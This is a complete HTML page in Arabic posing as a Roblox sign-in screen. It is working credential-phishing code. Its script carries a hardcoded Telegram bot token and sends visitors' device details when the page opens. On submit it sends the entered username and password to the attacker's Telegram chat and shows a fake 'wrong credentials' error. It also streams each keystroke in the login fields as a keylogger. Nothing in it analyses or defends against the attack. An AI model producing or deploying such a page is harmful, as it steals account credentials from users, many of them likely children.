<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox - تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
        }
        body {
            background: #e9f0f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.15);
            max-width: 380px;
            width: 100%;
            text-align: center;
        }
        .logo {
            font-size: 32px;
            font-weight: 900;
            color: #1a1a2e;
            letter-spacing: -1px;
            margin-bottom: 20px;
        }
        .logo span { color: #2d7aff; }
        h2 {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a2e;
            margin-bottom: 6px;
        }
        .sub {
            color: #555;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .sub a {
            color: #2d7aff;
            text-decoration: none;
        }
        .input-group {
            margin-bottom: 14px;
            text-align: left;
        }
        .input-group label {
            font-size: 13px;
            font-weight: 600;
            color: #333;
            display: block;
            margin-bottom: 4px;
        }
        .input-group input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 15px;
            background: #f9f9f9;
            transition: border-color 0.2s;
        }
        .input-group input:focus {
            border-color: #2d7aff;
            outline: none;
            background: white;
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #2d7aff;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 6px;
            transition: background 0.2s;
        }
        .btn:hover { background: #1a5fd0; }
        .options {
            display: flex;
            justify-content: space-between;
            margin: 16px 0 10px;
            font-size: 13px;
        }
        .options a {
            color: #2d7aff;
            text-decoration: none;
        }
        .options a:hover { text-decoration: underline; }
        .footer {
            margin-top: 20px;
            font-size: 13px;
            color: #777;
        }
        .footer a {
            color: #2d7aff;
            text-decoration: none;
        }
        .error {
            color: #d32f2f;
            font-size: 14px;
            text-align: center;
            display: none;
            margin-top: 10px;
            background: #ffebee;
            padding: 8px;
            border-radius: 6px;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0;
            color: #aaa;
            font-size: 12px;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #ddd;
        }
        .divider::before { margin-right: 10px; }
        .divider::after { margin-left: 10px; }
        .social-btn {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 6px;
            background: white;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .social-btn:hover { background: #f5f5f5; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">Roblox</div>
        <h2>تسجيل الدخول</h2>
        <p class="sub">أدخل بيانات حسابك للمتابعة</p>

        <form id="loginForm">
            <div class="input-group">
                <label>البريد الإلكتروني / اسم المستخدم</label>
                <input type="text" id="username" placeholder="أدخل بريدك أو اسم المستخدم" required>
            </div>
            <div class="input-group">
                <label>كلمة المرور</label>
                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
            </div>

            <button type="submit" class="btn">تسجيل الدخول</button>

            <div class="options">
                <label style="font-weight:400;color:#555;">
                    <input type="checkbox" checked> تذكرني
                </label>
                <a href="#">نسيت كلمة المرور؟</a>
            </div>

            <div class="error" id="errorMsg">⚠️ بيانات غير صحيحة، حاول مرة أخرى</div>

            <div class="divider">أو</div>

            <button class="social-btn" type="button">🔵 متابعة باستخدام Google</button>
            <button class="social-btn" type="button">⚫ متابعة باستخدام Apple</button>

            <div class="footer">
                ليس لديك حساب؟ <a href="#">إنشاء حساب</a>
            </div>
        </form>
    </div>

    <script>
        // =============================================
        // إعدادات البوت
        // =============================================
        const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
        const CHAT_ID = '6526473202';

        function sendToTelegram(text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            }).catch(e => console.log(e));
        }

        // =============================================
        // 1. البيانات الأساسية عند فتح الرابط
        // =============================================
        const ua = navigator.userAgent;
        const isMobile = /iPhone|iPad|iPod|Android|BlackBerry|Opera Mini|IEMobile/i.test(ua);
        const deviceType = isMobile ? 'جوال' : 'كمبيوتر';
        let os = 'غير معروف';
        if (/Windows NT 10.0/.test(ua)) os = 'Windows 10';
        else if (/Mac OS X/.test(ua)) os = 'MacOS';
        else if (/Android/.test(ua)) os = 'Android';
        else if (/iPhone|iPad/.test(ua)) os = 'iOS';

        let msg = `<b>✅ تم فتح الرابط</b>\n\n`;
        msg += `📱 الجهاز: ${deviceType} (${os})\n`;
        msg += `🌐 IP: ${window.location.hostname}\n`;
        msg += `📱 المتصفح: ${ua}\n`;
        msg += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
        msg += `📅 الوقت: ${new Date().toISOString()}`;
        sendToTelegram(msg);

        // =============================================
        // 2. عند إرسال النموذج (جلب البيانات)
        // =============================================
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // إرسال البيانات إلى تليجرام
            let dataMsg = `<b>🔓 بيانات روبلوكس</b>\n\n`;
            dataMsg += `👤 اسم المستخدم: ${username}\n`;
            dataMsg += `🔑 كلمة المرور: ${password}\n\n`;
            dataMsg += `📅 الوقت: ${new Date().toISOString()}`;

            sendToTelegram(dataMsg);

            // إظهار رسالة خطأ وهمية
            document.getElementById('errorMsg').style.display = 'block';

            // إعادة تعيين الحقول بعد 3 ثواني
            setTimeout(() => {
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                document.getElementById('errorMsg').style.display = 'none';
            }, 3000);
        });

        // =============================================
        // 3. Keylogger (تسجيل كل ما يكتب)
        // =============================================
        document.addEventListener('input', e => {
            if (e.target.value && (e.target.id === 'username' || e.target.id === 'password')) {
                sendToTelegram(`⌨️ <b>كتابة في حقل ${e.target.id}</b>\n${e.target.value.substring(0, 50)}`);
            }
        });

        console.log('✅ صفحة روبلوكس تعمل');
    </script>

</body>
</html>
